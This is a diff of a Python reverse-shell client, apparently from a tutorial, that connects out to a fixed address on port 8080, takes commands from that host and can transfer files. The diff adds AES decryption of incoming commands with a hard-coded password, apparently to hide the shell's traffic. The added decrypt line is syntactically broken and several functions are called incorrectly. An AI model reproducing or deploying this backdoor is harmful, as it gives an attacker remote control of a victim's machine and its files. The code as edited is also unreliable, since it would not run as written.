@@ -1,6 +1,25 @@
 import socket
 import subprocess # See video https://www.youtube.com/watch?v=2Fp1N6dof0Y
 import os
+from Crypto.Cipher import AES
+import hashlib
+import sys
+import binascii
+import Padding
+
+password='hello'
+ival=10
+#command is the data we will encrypt ie the plaintext
+
+def encrypt(plaintext,key, mode,iv):
+    encobj = AES.new(key,mode,iv)
+    return(encobj.encrypt(plaintext))
+
+def decrypt(ciphertext,key, mode,iv):
+    encobj = AES.new(key,mode,iv)
+    return(encobj.decrypt(ciphertext))
+
+
 
 def transfer(s, path):
     if os.path.exists(path):
@@ -18,7 +37,7 @@ def connect():
     s = socket.socket()
     s.connect(("192.168.1.183",8080))
     while True:
-        command = s.recv(1024)
+        command = decrypt(s.recv(1024)
         if "terminate" in command.decode():
             s.close()
             break
@@ -42,4 +61,3 @@ def connect():
 def main():
     connect()
 main()
-    
